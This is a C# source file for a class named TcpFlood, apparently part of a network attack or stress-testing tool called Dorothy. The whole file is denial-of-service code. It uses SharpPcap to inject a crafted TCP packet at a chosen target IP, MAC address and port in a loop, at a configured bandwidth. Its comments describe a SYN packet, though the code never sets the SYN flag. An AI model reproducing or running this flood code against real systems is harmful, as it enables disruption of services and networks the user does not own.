using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using NLog;
using PacketDotNet;
using PacketDotNet.Tcp;
using SharpPcap;
using SharpPcap.LibPcap;

namespace Dorothy.Models
{
    public class TcpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly string _sourceIp;
        private readonly PhysicalAddress _sourceMac;
        private readonly string _targetIp;
        private readonly byte[] _targetMac;
        private readonly int _targetPort;
        private readonly long _bytesPerSecond;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;

        public TcpFlood(string sourceIp, byte[] sourceMac, string targetIp, byte[] targetMac, int targetPort, long bytesPerSecond, CancellationToken cancellationToken)
        {
            _sourceIp = sourceIp;
            _sourceMac = new PhysicalAddress(sourceMac);
            _targetIp = targetIp;
            _targetMac = targetMac;
            _targetPort = targetPort;
            _bytesPerSecond = bytesPerSecond;
            _cancellationToken = cancellationToken;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting TCP Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr => addr.Addr.ipAddress != null && addr.Addr.ipAddress.ToString() == _sourceIp));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                if (_device is not IInjectionDevice injectionDevice)
                {
                    Logger.Error($"Device {_device.Name} does not support packet injection.");
                    throw new Exception($"Device {_device.Name} does not support packet injection.");
                }

                // Construct the Ethernet packet
                var ethernetPacket = new EthernetPacket(_sourceMac, new PhysicalAddress(_targetMac), EthernetType.IPv4);

                // Construct the IP packet
                var ipPacket = new IPv4Packet(IPAddress.Parse(_sourceIp), IPAddress.Parse(_targetIp))
                {
                    Protocol = ProtocolType.Tcp,
                    TimeToLive = 128
                };

                // Construct the TCP SYN packet
                var tcpPacket = new TcpPacket((ushort)GenerateRandomPort(), (ushort)_targetPort)
                {
                    WindowSize = 8192,
                    UrgentPointer = 0,
                    SequenceNumber = 0
                };
    
                tcpPacket.SequenceNumber = 0; // Optionally set the sequence number

                // Assign the TCP packet to the IP packet's payload
                ipPacket.PayloadPacket = tcpPacket;

                // Assign the IP packet to the Ethernet packet's payload
                ethernetPacket.PayloadPacket = ipPacket;

                // Calculate packets per second based on bytes per second
                var bytesPerSecondValue = _bytesPerSecond;
                int packetsPerSecond = (int)(bytesPerSecondValue / ethernetPacket.Bytes.Length);
                packetsPerSecond = Math.Max(packetsPerSecond, 1);
                double delay = 1000.0 / packetsPerSecond;

                Logger.Info($"TCP Flood: Sending {packetsPerSecond} packets per second ({_bytesPerSecond / 125_000} Mbps).");

                while (!_cancellationToken.IsCancellationRequested)
                {
                    try
                    {
                        injectionDevice.SendPacket(ethernetPacket);
                    }
                    catch (Exception ex)
                    {
                        Logger.Error(ex, "Failed to send TCP packet.");
                    }

                    await Task.Delay(TimeSpan.FromMilliseconds(delay), _cancellationToken)
                        .ContinueWith(t => { }, TaskContinuationOptions.OnlyOnCanceled);
                }
            }
            catch (TaskCanceledException)
            {
                Logger.Info("TCP Flood attack was canceled.");
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error during TCP Flood attack.");
            }
            finally
            {
                _device?.Close();
                Logger.Info("TCP Flood attack stopped.");
            }
        }

        private int GenerateRandomPort()
        {
            return new Random().Next(1024, 65535);
        }

        public void Dispose()
        {
            _device?.Dispose();
        }
    }
}
